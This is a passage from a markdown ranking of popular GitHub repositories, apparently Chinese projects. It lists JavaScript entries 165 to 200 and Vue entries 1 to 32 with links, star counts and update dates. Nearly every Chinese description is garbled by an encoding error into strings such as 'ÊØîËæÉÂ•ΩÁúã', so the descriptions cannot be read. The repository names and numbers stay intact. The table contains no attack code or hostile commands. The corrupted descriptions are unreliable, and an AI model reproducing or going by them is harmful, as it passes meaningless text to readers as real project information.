|165|[waynecz/dadda-translate-crx](https://github.com/waynecz/dadda-translate-crx)|üê± ÊØîËæÉÂ•ΩÁúãÁöÑ Chrome ÂàíËØçÁøªËØë(ÊêúÁãó)Êèí‰ª∂ÔºåËá™Â∏¶ÁîüËØçÁ∞øÂèäÂêêÂè∏ÂºπËØçËÆ∞ÂøÜÔºåÂèØ‰∏éÊúâÈÅì„ÄÅÊâáË¥ùÂçïËØçÂêåÊ≠•|1.5k|JavaScript|06/26|
|166|[SmallRuralDog/electron-vue-music](https://github.com/SmallRuralDog/electron-vue-music)|Âü∫‰∫é electron-vue ÂºÄÂèëÁöÑÈü≥‰πêÊí≠ÊîæÂô®ÔºåÁïåÈù¢Ê®°‰ªøQQÈü≥‰πêÔºåÊäÄÊúØÊ†àelectron-vue+vue+vuex+vue-router+element- UI„ÄÇÊ¨¢Ëøéstar|1.5k|JavaScript|04/13|
|167|[bobiscool/wxDraw](https://github.com/bobiscool/wxDraw)|A lightweight canvas library which providing 2d draw for weapp  ÂæÆ‰ø°Â∞èÁ®ãÂ∫è2dÂä®ÁîªÂ∫ì üòé  üêº|1.5k|JavaScript|07/17|
|168|[areslabs/alita](https://github.com/areslabs/alita)|‰∏ÄÂ•óÊääReact Native‰ª£Á†ÅËΩ¨Êç¢ÊàêÂæÆ‰ø°Â∞èÁ®ãÂ∫è‰ª£Á†ÅÁöÑËΩ¨Êç¢ÂºïÊìéÂ∑•ÂÖ∑„ÄÇÊàë‰ª¨‰∏çÈÄ†ËΩÆÂ≠êÔºå‰∏çÂèëÊòéÊñ∞Ê°ÜÊû∂ÔºåÂè™ÊòØÊèê‰æõÂ∑•ÂÖ∑ÊääRNÊâ©Â±ïÂà∞ÂæÆ‰ø°Â∞èÁ®ãÂ∫èÁ´Ø„ÄÇ|1.5k|JavaScript|08/14|
|169|[metowolf/vCards](https://github.com/metowolf/vCards)|üì°Ô∏è vCards ‰∏≠ÂõΩÈªÑÈ°µ - ‰ºòÂåñ iOS/Android Êù•Áîµ„ÄÅ‰ø°ÊÅØÁïåÈù¢‰ΩìÈ™å|1.5k|JavaScript|08/26|
|170|[iBase4J/iBase4J](https://github.com/iBase4J/iBase4J)|SpringÔºåSpringBoot 2.0ÔºåSpringMVCÔºåMybatisÔºåmybatis-plusÔºåmotan/dubboÂàÜÂ∏ÉÂºèÔºåRedisÁºìÂ≠òÔºåShiroÊùÉÈôêÁÆ°ÁêÜÔºåSpring-SessionÂçïÁÇπÁôªÂΩïÔºåQuartzÂàÜÂ∏ÉÂºèÈõÜÁæ§Ë∞ÉÂ∫¶ÔºåRestfulÊúçÂä°ÔºåQQ/ÂæÆ‰ø°ÁôªÂΩïÔºåApp tokenÁôªÂΩïÔºåÂæÆ‰ø°/ÊîØ‰ªòÂÆùÊîØ‰ªòÔºõÊó•ÊúüËΩ¨Êç¢„ÄÅÊï∞ÊçÆÁ±ªÂûãËΩ¨Êç¢„ÄÅÂ∫èÂàóÂåñ„ÄÅÊ±âÂ≠óËΩ¨ÊãºÈü≥„ÄÅË∫´‰ªΩËØÅÂè∑Á†ÅÈ™åËØÅ„ÄÅÊï∞Â≠óËΩ¨‰∫∫Ê∞ëÂ∏Å„ÄÅÂèëÈÄÅÁü≠‰ø°„ÄÅÂèëÈÄÅÈÇÆ‰ª∂„ÄÅÂä†ÂØÜËß£ÂØÜ„ÄÅÂõæÁâáÂ§ÑÁêÜ„ÄÅexcelÂØºÂÖ•ÂØºÂá∫„ÄÅFTP/SFTP/fastDFS‰∏ä‰º†‰∏ãËΩΩ„ÄÅ‰∫åÁª¥Á†Å„ÄÅXMLËØªÂÜô„ÄÅÈ´òÁ≤æÂ∫¶ËÆ°ÁÆó„ÄÅÁ≥ªÁªüÈÖçÁΩÆÂ∑•ÂÖ∑Á±ªÁ≠âÁ≠â„ÄÇ|1.5k|JavaScript|06/06|
|171|[lisong/code-push-server](https://github.com/lisong/code-push-server)|CodePush service is hot update services which adapter react-native-code-push and cordova-plugin-code-push - ÁÉ≠Êõ¥Êñ∞|1.5k|JavaScript|09/04|
|172|[nmxiaowei/avue](https://github.com/nmxiaowei/avue)|Avue.js2.0ÊòØÂü∫‰∫éÁé∞ÊúâÁöÑelement-uiÂ∫ìËøõË°åÁöÑ‰∫åÊ¨°Â∞ÅË£ÖÔºåÁÆÄÂåñ‰∏Ä‰∫õÁπÅÁêêÁöÑÊìç‰ΩúÔºåÊ†∏ÂøÉÁêÜÂøµ‰∏∫Êï∞ÊçÆÈ©±Âä®ËßÜÂõæ,‰∏ªË¶ÅÁöÑÁªÑ‰ª∂Â∫ìÈíàÂØπtableË°®Ê†ºÂíåformË°®ÂçïÂú∫ÊôØÔºåÂêåÊó∂Ë°çÁîüÂá∫Êõ¥Â§ö‰ºÅ‰∏öÂ∏∏Áî®ÁöÑÁªÑ‰ª∂ÔºåËææÂà∞È´òÂ§çÁî®ÔºåÂÆπÊòìÁª¥Êä§ÂíåÊâ©Â±ïÁöÑÊ°ÜÊû∂ÔºåÂêåÊó∂ÂÜÖÁΩÆ‰∫Ü‰∏∞ÂØå‰∫ÜÊï∞ÊçÆÂ±ïÁ§∫ÁªÑ‰ª∂ÔºåËÆ©ÂºÄÂèëÂèòÂæóÊõ¥Âä†ÂÆπÊòì|1.5k|JavaScript|10/30|
|173|[coderwhy/HYMiniMall](https://github.com/coderwhy/HYMiniMall)|Â∞èÁ®ãÂ∫èÂïÜÂú∫È°πÁõÆ|1.4k|JavaScript|09/09|
|174|[sleepybear1113/taobaoVisitingVenues](https://github.com/sleepybear1113/taobaoVisitingVenues)|‰∫¨‰∏ú/Ê∑òÂÆùÁöÑËá™Âä®ÊµèËßàÈÄõÂ∫óËÑöÊú¨|1.4k|JavaScript|10/22|
|175|[mynane/PDF](https://github.com/mynane/PDF)|Êî∂ÈõÜÁöÑÂêÑÁßçËµÑÊ∫ê|1.4k|JavaScript|07/14|
|176|[Tomotoes/scrcpy-gui](https://github.com/Tomotoes/scrcpy-gui)|üëª A simple & beautiful GUI application for scrcpy. QQÁæ§:734330215|1.4k|JavaScript|10/25|
|177|[edusoho/edusoho](https://github.com/edusoho/edusoho)|EduSoho ÁΩëÁªúËØæÂ†ÇÊòØÁî±Êù≠Â∑ûÈòîÁü•ÁΩëÁªúÁßëÊäÄÊúâÈôêÂÖ¨Âè∏Á†îÂèëÁöÑÂºÄÊ∫êÁΩëÊ†°Á≥ªÁªü„ÄÇEduSoho ÂåÖÂê´‰∫ÜÂú®Á∫øÊïôÂ≠¶„ÄÅÊãõÁîüÂíåÁÆ°ÁêÜÁ≠âÂÆåÊï¥ÂäüËÉΩÔºåËÆ©ÊïôËÇ≤Êú∫ÊûÑÂèØ‰ª•Èõ∂Èó®ÊßõÂª∫Á´ãÁΩëÊ†°ÔºåÊàêÂäüËΩ¨ÂûãÂú®Á∫øÊïôËÇ≤„ÄÇEduSoho ‰πüÂèØ‰Ωú‰∏∫‰ºÅ‰∏öÂÜÖËÆ≠Âπ≥Âè∞ÔºåÂ∏ÆÂä©‰ºÅ‰∏öÂÆûÁé∞‰∫∫ÊâçÂüπÂÖª„ÄÇ|1.4k|JavaScript|09/23|
|178|[yioMe/nodejs_wx_aipay_api](https://github.com/yioMe/nodejs_wx_aipay_api)|ÂæÆ‰ø°ÊîØ‰ªòÂÆù‰∏™‰∫∫ÂÖçÁ≠æÊî∂Ê¨æApiÁ≥ªÁªüÔºåÊúâ‰∫ÜÂÆÉÂØπÊé•ÂÜç‰πü‰∏çÁî®ÊãÖÂøÉÊàëÁöÑ‰∏öÂä°‰∏çËÉΩÊîØ‰ªò‰∫Ü|1.4k|JavaScript|10/27|
|179|[cnodejs/egg-cnode](https://github.com/cnodejs/egg-cnode)|CNode Á§æÂå∫ Egg ÁâàÊú¨|1.4k|JavaScript|05/01|
|180|[nodeWechat/wechat4u](https://github.com/nodeWechat/wechat4u)|ÂæÆ‰ø° wechat web ÁΩëÈ°µÁâàÊé•Âè£ÁöÑ JavaScript ÂÆûÁé∞ÔºåÂÖºÂÆπNodeÂíåÊµèËßàÂô®ÔºåÂæÆ‰ø°Êú∫Âô®‰∫∫|1.4k|JavaScript|09/03|
|181|[zhaoolee/OnlineToolsBook](https://github.com/zhaoolee/OnlineToolsBook)|üç≠Âú®Á∫øÂ∑•ÂÖ∑ÁßòÁ±ç,‰∏∫Âú®Á∫øÂ∑•ÂÖ∑ÂÜô‰∏ÄÊú¨‰ºòË¥®ËØ¥Êòé‰π¶,ËÆ©Âú®Á∫øÂ∑•ÂÖ∑ÈÄ†Á¶è‰∫∫Á±ª~ Online tool cheats, write a quality manual for online tools, make online tools benefit humanity~|1.4k|JavaScript|10/21|
|182|[sanyuan0704/react-cloud-music](https://github.com/sanyuan0704/react-cloud-music)|React 16.8ÊâìÈÄ†Á≤æÁæéÈü≥‰πêWebApp|1.4k|JavaScript|09/18|
|183|[thinkgem/jeesite4](https://github.com/thinkgem/jeesite4)|Java EE ‰ºÅ‰∏öÁ∫ßÂø´ÈÄüÂºÄÂèëÂπ≥Âè∞ÔºåÂü∫‰∫éÁªèÂÖ∏ÊäÄÊúØÁªÑÂêàÔºàSpring Boot„ÄÅSpring MVC„ÄÅApache Shiro„ÄÅMyBatis„ÄÅBeetl„ÄÅBootstrap„ÄÅAdminLTEÔºâÔºåÂú®Á∫ø‰ª£Á†ÅÁîüÊàêÂäüËÉΩÔºåÂåÖÊã¨Ê†∏ÂøÉÊ®°ÂùóÂ¶ÇÔºöÁªÑÁªáÊú∫ÊûÑ„ÄÅËßíËâ≤Áî®Êà∑„ÄÅËèúÂçïÂèäÊåâÈíÆÊéàÊùÉ„ÄÅÊï∞ÊçÆÊùÉÈôê„ÄÅÁ≥ªÁªüÂèÇÊï∞„ÄÅÂÜÖÂÆπÁÆ°ÁêÜ„ÄÅÂ∑•‰ΩúÊµÅÁ≠â„ÄÇÈááÁî®ÊùæËÄ¶ÂêàËÆæËÆ°ÔºõÁïåÈù¢Êó†Âà∑Êñ∞Ôºå‰∏ÄÈîÆÊç¢ËÇ§Ôºõ‰ºóÂ§öË¥¶Âè∑ÂÆâÂÖ®ËÆæÁΩÆÔºåÂØÜÁ†ÅÁ≠ñÁï•ÔºõÂú®Á∫øÂÆöÊó∂‰ªªÂä°ÈÖçÁΩÆÔºõÊîØÊåÅÈõÜÁæ§ÔºåÊîØÊåÅSAASÔºõÊîØÊåÅÂ§öÊï∞ÊçÆÊ∫ê|1.4k|JavaScript|10/27|
|184|[threadshare/php](https://github.com/threadshare/php)|‰∏∫ÂàöÂàöÂ≠¶‰π†phpËØ≠Ë®Ä‰ª•ÂèäwebÁΩëÁ´ôÂºÄÂèëÊï¥ÁêÜÁöÑ‰∏ÄÂ•óËµÑÊ∫êÔºåÊúâËßÜÈ¢ëÔºåÂÆûÊàò‰ª£Á†ÅÔºåÂ≠¶‰π†Ë∑ØÂæÑÁ≠â„ÄÇ‰ºöÊåÅÁª≠Êõ¥Êñ∞„ÄÇ„ÄÇ„ÄÇ|1.4k|JavaScript|02/17|
|185|[tencentyun/TIMSDK](https://github.com/tencentyun/TIMSDK)|ËÖæËÆØ‰∫ëÂç≥Êó∂ÈÄö‰ø° IM ÊúçÂä°ÔºåÂõΩÂÜÖ‰∏ãËΩΩÈïúÂÉèÔºö|1.3k|JavaScript|10/27|
|186|[LANIF-UI/dva-boot-admin](https://github.com/LANIF-UI/dva-boot-admin)|:cake: react admin dashboard ui LANIF-ADMIN --- react 16 + react-router 4 + dva 2 + antd 4 ÂêéÂè∞ÁÆ°ÁêÜ ËÑöÊâãÊû∂|1.3k|JavaScript|09/29|
|187|[phalapi/phalapi](https://github.com/phalapi/phalapi)|A PHP framework foucs on API fast development.Êé•Âè£Ôºå‰ªéÁÆÄÂçïÂºÄÂßãÔºÅPhalApiÁÆÄÁß∞œÄÊ°ÜÊû∂Ôºå‰∏Ä‰∏™ËΩªÈáèÁ∫ßPHPÂºÄÊ∫êÊé•Âè£Ê°ÜÊû∂Ôºå‰∏ìÊ≥®‰∫éÊé•Âè£ÊúçÂä°ÂºÄÂèë„ÄÇ|1.3k|JavaScript|10/29|
|188|[xland/xiangxuema](https://github.com/xland/xiangxuema)|‚ÄúÊÉ≥Â≠¶Âêó‚Äù‰∏™‰∫∫Áü•ËØÜÁÆ°ÁêÜ‰∏éËá™Â™í‰ΩìËê•ÈîÄÂ∑•ÂÖ∑|1.3k|JavaScript|07/07|
|189|[f2e-awesome/knowledge](https://github.com/f2e-awesome/knowledge)|ÊñáÊ°£ÁùÄÈáçÊûÑÂª∫‰∏Ä‰∏™ÂÆåÊï¥ÁöÑ„ÄåÂâçÁ´ØÊäÄÊúØÊû∂ÊûÑÂõæË∞±„ÄçÔºåÊñπ‰æø F2E(Front End EngineeringÂèàÁß∞FEE„ÄÅF2E) Â≠¶‰π†‰∏éËøõÈò∂„ÄÇ|1.3k|JavaScript|07/16|
|190|[teadocs/numpy-cn](https://github.com/teadocs/numpy-cn)|NumPyÂÆòÊñπ‰∏≠ÊñáÊñáÊ°£ÔºàÂÆåÊï¥ÁâàÔºâ|1.3k|JavaScript|10/17|
|191|[sbfkcel/towxml](https://github.com/sbfkcel/towxml)|ÂæÆ‰ø°Â∞èÁ®ãÂ∫èHTML„ÄÅMarkdownÊ∏≤ÊüìÂ∫ì|1.3k|JavaScript|09/25|
|192|[dubboclub/dubbokeeper](https://github.com/dubboclub/dubbokeeper)|dubboÊúçÂä°ÁÆ°ÁêÜ‰ª•ÂèäÁõëÊéßÁ≥ªÁªü|1.3k|JavaScript|07/03|
|193|[xiongwilee/Gracejs](https://github.com/xiongwilee/Gracejs)|A Nodejs BFF framework, build with koa2ÔºàÂü∫‰∫ékoa2ÁöÑÊ†áÂáÜÂâçÂêéÁ´ØÂàÜÁ¶ªÊ°ÜÊû∂Ôºâ|1.3k|JavaScript|07/19|
|194|[purplebamboo/font-carrier](https://github.com/purplebamboo/font-carrier)|font-carrierÊòØ‰∏Ä‰∏™ÂäüËÉΩÂº∫Â§ßÁöÑÂ≠ó‰ΩìÊìç‰ΩúÂ∫ìÔºå‰ΩøÁî®ÂÆÉ‰Ω†ÂèØ‰ª•ÈöèÂøÉÊâÄÊ¨≤ÁöÑÊìç‰ΩúÂ≠ó‰Ωì„ÄÇËÆ©‰Ω†ÂèØ‰ª•Âú®svgÁöÑÁª¥Â∫¶ÊîπÈÄ†Â≠ó‰ΩìÁöÑÂ±ïÁé∞ÂΩ¢Áä∂„ÄÇ|1.3k|JavaScript|04/03|
|195|[ctripcorp/CRN](https://github.com/ctripcorp/CRN)|CRNÊòØCtrip React NativeÁÆÄÁß∞ÔºåÁî±Êê∫Á®ãÊó†Á∫øÂπ≥Âè∞Á†îÂèëÂõ¢ÈòüÂü∫‰∫éReact NativeÊ°ÜÊû∂‰ºòÂåñÔºåÂÆöÂà∂ÊàêÁ®≥ÂÆöÊÄßÂíåÊÄßËÉΩÊõ¥‰Ω≥„ÄÅ‰πüÊõ¥ÈÄÇÂêà‰∏öÂä°Âú∫ÊôØÁöÑË∑®Âπ≥Âè∞ÂºÄÂèëÊ°ÜÊû∂„ÄÇ|1.3k|JavaScript|10/16|
|196|[gengchen528/wechatBot](https://github.com/gengchen528/wechatBot)|ÂæÆ‰ø°ÊØèÊó•ËØ¥Ôºå‰∏âÊ≠•Êïô‰Ω†Áî®NodeÂÅö‰∏Ä‰∏™ÂæÆ‰ø°ÂìÑÂ•≥Âèã(Âü∫Âèã)Á•ûÂô®ÔºÅËøòËÉΩÂ∏ÆÂ•≥ÊúãÂèãËß£ÂÜ≥ÂûÉÂúæÂàÜÁ±ªÈöæÈ¢ò|1.3k|JavaScript|05/11|
|197|[karsonzhang/fastadmin](https://github.com/karsonzhang/fastadmin)|Âü∫‰∫é ThinkPHP5 Âíå Bootstrap ÁöÑÊûÅÈÄüÂêéÂè∞ÂºÄÂèëÊ°ÜÊû∂Ôºå‰∏ÄÈîÆÁîüÊàê CRUDÔºåËá™Âä®ÁîüÊàêÊéßÂà∂Âô®„ÄÅÊ®°Âûã„ÄÅËßÜÂõæ„ÄÅJS„ÄÅËØ≠Ë®ÄÂåÖ„ÄÅËèúÂçï„ÄÅÂõûÊî∂Á´ô„ÄÇ|1.3k|JavaScript|10/21|
|198|[u014427391/jeeplatform](https://github.com/u014427391/jeeplatform)|‰∏ÄÊ¨æ‰ºÅ‰∏ö‰ø°ÊÅØÂåñÂºÄÂèëÂü∫Á°ÄÂπ≥Âè∞ÔºåÊãüÈõÜÊàêOA(ÂäûÂÖ¨Ëá™Âä®Âåñ)„ÄÅCMS(ÂÜÖÂÆπÁÆ°ÁêÜÁ≥ªÁªü)Á≠â‰ºÅ‰∏öÁ≥ªÁªüÁöÑÈÄöÁî®‰∏öÂä°ÂäüËÉΩ  JeePlatformÈ°πÁõÆÊòØ‰∏ÄÊ¨æ‰ª•SpringBoot‰∏∫Ê†∏ÂøÉÊ°ÜÊû∂ÔºåÈõÜORMÊ°ÜÊû∂MybatisÔºåWebÂ±ÇÊ°ÜÊû∂SpringMVCÂíåÂ§öÁßçÂºÄÊ∫êÁªÑ‰ª∂Ê°ÜÊû∂ËÄåÊàêÁöÑ‰∏ÄÊ¨æÈÄöÁî®Âü∫Á°ÄÂπ≥Âè∞Ôºå‰ª£Á†ÅÂ∑≤ÁªèÊçêËµ†ÁªôÂºÄÊ∫ê‰∏≠ÂõΩÁ§æÂå∫|1.2k|JavaScript|07/02|
|199|[nodejscn/node-api-cn](https://github.com/nodejscn/node-api-cn)|Node.js API ‰∏≠ÊñáÊñáÊ°£|1.2k|JavaScript|10/18|
|200|[ciaochaos/qrbtf](https://github.com/ciaochaos/qrbtf)|An art QR code (qrcode) beautifier.  Ëâ∫ÊúØ‰∫åÁª¥Á†ÅÁîüÊàêÂô®„ÄÇhttps://qrbtf.com|1.2k|JavaScript|09/02|

‚¨Ü [ÂõûÂà∞ÁõÆÂΩï](#ÁõÆÂΩï)

<br/>

## Vue

|#|Repository|Description|Stars|Language|Updated|
|:-|:-|:-|:-|:-|:-|
|1|[bailicangdu/vue2-elm](https://github.com/bailicangdu/vue2-elm)|Âü∫‰∫é vue2 + vuex ÊûÑÂª∫‰∏Ä‰∏™ÂÖ∑Êúâ 45 ‰∏™È°µÈù¢ÁöÑÂ§ßÂûãÂçïÈ°µÈù¢Â∫îÁî®|34.7k|Vue|09/27|
|2|[lin-xin/vue-manage-system](https://github.com/lin-xin/vue-manage-system)|Âü∫‰∫évue + elementÁöÑÂêéÂè∞ÁÆ°ÁêÜÁ≥ªÁªüËß£ÂÜ≥ÊñπÊ°à|11.4k|Vue|10/19|
|3|[bailicangdu/vue2-manage](https://github.com/bailicangdu/vue2-manage)|Âü∫‰∫é vue + element-ui ÁöÑÂêéÂè∞ÁÆ°ÁêÜÁ≥ªÁªü|10.0k|Vue|08/31|
|4|[weilanwl/ColorUI](https://github.com/weilanwl/ColorUI)|È≤ú‰∫ÆÁöÑÈ´òÈ•±ÂíåËâ≤ÂΩ©Ôºå‰∏ìÊ≥®ËßÜËßâÁöÑÂ∞èÁ®ãÂ∫èÁªÑ‰ª∂Â∫ì|9.6k|Vue|10/18|
|5|[lyswhut/lx-music-desktop](https://github.com/lyswhut/lx-music-desktop)|‰∏Ä‰∏™Âü∫‰∫é electron ÁöÑÈü≥‰πêËΩØ‰ª∂|8.6k|Vue|10/30|
|6|[macrozheng/mall-admin-web](https://github.com/macrozheng/mall-admin-web)|mall-admin-webÊòØ‰∏Ä‰∏™ÁîµÂïÜÂêéÂè∞ÁÆ°ÁêÜÁ≥ªÁªüÁöÑÂâçÁ´ØÈ°πÁõÆÔºåÂü∫‰∫éVue+ElementÂÆûÁé∞„ÄÇ ‰∏ªË¶ÅÂåÖÊã¨ÂïÜÂìÅÁÆ°ÁêÜ„ÄÅËÆ¢ÂçïÁÆ°ÁêÜ„ÄÅ‰ºöÂëòÁÆ°ÁêÜ„ÄÅ‰øÉÈîÄÁÆ°ÁêÜ„ÄÅËøêËê•ÁÆ°ÁêÜ„ÄÅÂÜÖÂÆπÁÆ°ÁêÜ„ÄÅÁªüËÆ°Êä•Ë°®„ÄÅË¥¢Âä°ÁÆ°ÁêÜ„ÄÅÊùÉÈôêÁÆ°ÁêÜ„ÄÅËÆæÁΩÆÁ≠âÂäüËÉΩ„ÄÇ|7.2k|Vue|10/08|
|7|[chuzhixin/vue-admin-beautiful](https://github.com/chuzhixin/vue-admin-beautiful)|üöÄüöÄüöÄvue3.0,vue3,vue3.x,vue.js,ÂêéÂè∞ÁÆ°ÁêÜÔºågithubÂºÄÊ∫êadmin‰∏≠ÊúÄ‰ºòÁßÄÁöÑvue3.0ÈõÜÊàêÊ°ÜÊû∂‰πã‰∏ÄÔºåÂÆÉÊòØÂõΩÂÜÖÈ¶ñ‰∏™Âü∫‰∫évue3.0 + antdvÁöÑÂºÄÊ∫êadminÈ°πÁõÆÔºåÂêåÊó∂ÊîØÊåÅÁîµËÑëÔºåÊâãÊú∫ÔºåÂπ≥ÊùøÔºåüî•üî•üî•vue3.0-antdvÂàÜÊîØ‰ΩøÁî®vue3.xÂºÄÂèëÔºåmasterÂàÜÊîØ‰ΩøÁî®ÁöÑÊòØvue2.xÂºÄÂèë|6.0k|Vue|10/28|
|8|[Hunlongyu/ZY-Player](https://github.com/Hunlongyu/ZY-Player)|‚ñ∂Ô∏è Ë∑®Âπ≥Âè∞Ê°åÈù¢Á´ØËßÜÈ¢ëËµÑÊ∫êÊí≠ÊîæÂô®.ÁÆÄÊ¥ÅÊó†ÂπøÂëä.ÂÖçË¥πÈ´òÈ¢úÂÄº. üéû|5.7k|Vue|10/30|
|9|[chaitin/xray](https://github.com/chaitin/xray)|‰∏ÄÊ¨æÂÆåÂñÑÁöÑÂÆâÂÖ®ËØÑ‰º∞Â∑•ÂÖ∑ÔºåÊîØÊåÅÂ∏∏ËßÅ web ÂÆâÂÖ®ÈóÆÈ¢òÊâ´ÊèèÂíåËá™ÂÆö‰πâ poc   ‰ΩøÁî®‰πãÂâçÂä°ÂøÖÂÖàÈòÖËØªÊñáÊ°£|4.2k|Vue|10/22|
|10|[DataV-Team/DataV](https://github.com/DataV-Team/DataV)|VueÊï∞ÊçÆÂèØËßÜÂåñÁªÑ‰ª∂Â∫ìÔºàÁ±ª‰ººÈòøÈáåDataVÔºåÂ§ßÂ±èÊï∞ÊçÆÂ±ïÁ§∫ÔºâÔºåÊèê‰æõSVGÁöÑËæπÊ°ÜÂèäË£ÖÈ•∞„ÄÅÂõæË°®„ÄÅÊ∞¥‰ΩçÂõæ„ÄÅÈ£ûÁ∫øÂõæÁ≠âÁªÑ‰ª∂ÔºåÁÆÄÂçïÊòìÁî®ÔºåÈïøÊúüÊõ¥Êñ∞(ReactÁâàÂ∑≤ÂèëÂ∏É)|3.6k|Vue|09/09|
|11|[GavinZhuLei/vue-form-making](https://github.com/GavinZhuLei/vue-form-making)|A visual form designer/generator base on Vue.js, make form development simple and efficient.ÔºàÂü∫‰∫éVueÁöÑÂèØËßÜÂåñË°®ÂçïËÆæËÆ°Âô®ÔºåËÆ©Ë°®ÂçïÂºÄÂèëÁÆÄÂçïËÄåÈ´òÊïà„ÄÇÔºâ|3.6k|Vue|09/08|
|12|[herozhou/vue-framework-wz](https://github.com/herozhou/vue-framework-wz)|üëèvueÂêéÂè∞ÁÆ°ÁêÜÊ°ÜÊû∂üëè|3.5k|Vue|04/30|
|13|[mescroll/mescroll](https://github.com/mescroll/mescroll)|Á≤æËá¥ÁöÑ‰∏ãÊãâÂà∑Êñ∞Âíå‰∏äÊãâÂä†ËΩΩ jsÊ°ÜÊû∂.ÊîØÊåÅvue,ÂÆåÁæéËøêË°å‰∫éÁßªÂä®Á´ØÂíå‰∏ªÊµÅPCÊµèËßàÂô® (JS framework for pull-refresh and pull-up-loading)|3.3k|Vue|09/15|
|14|[ustbhuangyi/vue-sell](https://github.com/ustbhuangyi/vue-sell)|:rice: Vue.jsÈ´ò‰ªøÈ•ø‰∫Ü‰πàÂ§ñÂçñAppËØæÁ®ãÊ∫êÁ†Å http://coding.imooc.com/class/74.html|3.3k|Vue|04/20|
|15|[ymm-tech/gods-pen](https://github.com/ymm-tech/gods-pen)|Âü∫‰∫évueÁöÑÈ´òÊâ©Â±ïÂú®Á∫øÁΩëÈ°µÂà∂‰ΩúÂπ≥Âè∞ÔºåÂèØËá™ÂÆö‰πâÁªÑ‰ª∂ÔºåÂèØÊ∑ªÂä†ËÑöÊú¨ÔºåÂèØÊï∞ÊçÆÁªüËÆ°„ÄÇA mobile page builder/editor, similar with amolink. |3.2k|Vue|09/10|
|16|[Heeexy/SpringBoot-Shiro-Vue](https://github.com/Heeexy/SpringBoot-Shiro-Vue)|Êèê‰æõ‰∏ÄÂ•óÂü∫‰∫éSpring Boot-Shiro-VueÁöÑÊùÉÈôêÁÆ°ÁêÜÊÄùË∑Ø.ÂâçÂêéÁ´ØÈÉΩÂä†‰ª•ÊéßÂà∂,ÂÅöÂà∞ÊåâÈíÆ/Êé•Âè£Á∫ßÂà´ÁöÑÊùÉÈôê|3.2k|Vue|09/21|
|17|[wdlhao/vue2-element-touzi-admin](https://github.com/wdlhao/vue2-element-touzi-admin)| Âü∫‰∫évue2.0 +vuex+ element-uiÂêéÂè∞ÁÆ°ÁêÜÁ≥ªÁªü |3.1k|Vue|09/04|
|18|[ZyqGitHub1/h-player-v2](https://github.com/ZyqGitHub1/h-player-v2)|ËµÑÊ∫êÈááÈõÜÁ´ôÂú®Á∫øÊí≠Êîæ|2.9k|Vue|09/10|
|19|[bailichen/vue-weixin](https://github.com/bailichen/vue-weixin)|Vue2 ÂÖ®ÂÆ∂Ê°∂‰ªø ÂæÆ‰ø°App È°πÁõÆÔºåÊîØÊåÅÂ§ö‰∫∫Âú®Á∫øËÅäÂ§©ÂíåÊú∫Âô®‰∫∫ËÅäÂ§©|2.5k|Vue|09/04|
|20|[jdf2e/nutui](https://github.com/jdf2e/nutui)|ËΩªÈáèÁ∫ßÁßªÂä®Á´Ø Vue ÁªÑ‰ª∂Â∫ì (A Vue.js UI Toolkit for Mobile Web)|2.4k|Vue|10/29|
|21|[mgbq/nx-admin](https://github.com/mgbq/nx-admin)| üëç A magical   üêÆ  ‚öî  vue adminÔºåËÆ∞Âæóstar|2.3k|Vue|05/11|
|22|[elunez/eladmin-web](https://github.com/elunez/eladmin-web)|eladminÂâçÁ´ØÊ∫êÁ†ÅÔºåÈ°πÁõÆÂü∫‰∫é Spring Boot 2.1.0 „ÄÅ Spring Boot Jpa„ÄÅ Spring Security„ÄÅRedis„ÄÅVueÁöÑÂâçÂêéÁ´ØÂàÜÁ¶ªÂêéÂè∞ÁÆ°ÁêÜÁ≥ªÁªüÔºå ÊùÉÈôêÊéßÂà∂ÈááÁî® RBACÔºåËèúÂçïÂä®ÊÄÅË∑ØÁî±|2.3k|Vue|10/20|
|23|[lybenson/bilibili-vue](https://github.com/lybenson/bilibili-vue)|ÂâçÁ´Øvue+ÂêéÁ´ØkoaÔºåÂÖ®Ê†àÂºèÂºÄÂèëbilibiliÈ¶ñÈ°µ|2.3k|Vue|09/08|
|24|[JakHuang/form-generator](https://github.com/JakHuang/form-generator)|:sparkles:Element UIË°®ÂçïËÆæËÆ°Âèä‰ª£Á†ÅÁîüÊàêÂô®|2.2k|Vue|10/16|
|25|[febsteam/FEBS-Vue](https://github.com/febsteam/FEBS-Vue)|SpringBootÔºåShiroÔºåJWTÔºåVue & Ant Design ÂâçÂêéÁ´ØÂàÜÁ¶ªÊùÉÈôêÁÆ°ÁêÜÁ≥ªÁªüÔºàÁ≤æÂäõÊúâÈôêÔºåÂÅúÊ≠¢Áª¥Êä§Ôºâ|2.0k|Vue|07/02|
|26|[Exrick/xmall-front](https://github.com/Exrick/xmall-front)|Âü∫‰∫éVueÂºÄÂèëÁöÑXMallÂïÜÂüéÂâçÂè∞È°µÈù¢ PCÁ´Ø|1.9k|Vue|09/05|
|27|[Geek-James/ddBuy](https://github.com/Geek-James/ddBuy)|üéâVueÂÖ®ÂÆ∂Ê°∂+Vant Êê≠Âª∫Â§ßÂûãÂçïÈ°µÈù¢ÁîµÂïÜÈ°πÁõÆ.http://ddbuy.7-orange.cn|1.9k|Vue|09/22|
|28|[halfrost/vue-objccn](https://github.com/halfrost/vue-objccn)|üî• Use Vue.js to develop a cross-platform full stack application / Áî® Vue.js ÂºÄÂèëÁöÑË∑®‰∏âÁ´ØÂ∫îÁî®|1.9k|Vue|08/27|
|29|[open-source-labs/OverVue](https://github.com/open-source-labs/OverVue)|Prototyping Tool For Vue Devs ÈÄÇÁî®‰∫éVueÁöÑÂéüÂûãÂ∑•ÂÖ∑|1.8k|Vue|09/10|
|30|[YanxinNet/uView](https://github.com/YanxinNet/uView)|uView UIÔºåÊòØuni-appÁîüÊÄÅÊúÄ‰ºòÁßÄÁöÑUIÊ°ÜÊû∂ÔºåÂÖ®Èù¢ÁöÑÁªÑ‰ª∂Âíå‰æøÊç∑ÁöÑÂ∑•ÂÖ∑‰ºöËÆ©ÊÇ®‰ø°ÊâãÊãàÊù•ÔºåÂ¶ÇÈ±ºÂæóÊ∞¥|1.8k|Vue|10/25|
|31|[github1586/nuxt-bnhcp](https://github.com/github1586/nuxt-bnhcp)|nuxt„ÄÅexpress„ÄÅvue„ÄÅmysql„ÄÅredis„ÄÅnginx„ÄÅsocket.io (ÂÆûÊàòÂïÜÂüé)|1.8k|Vue|09/11|
|32|[zhaohaodang/vue-WeChat](https://github.com/zhaohaodang/vue-WeChat)|:fire: ‰∏ÄÊ¨æÂü∫‰∫éVue2.0È´ò‰ªøÂæÆ‰ø°AppÁöÑÂçïÈ°µÂ∫îÁî®|1.7k|Vue|09/03|
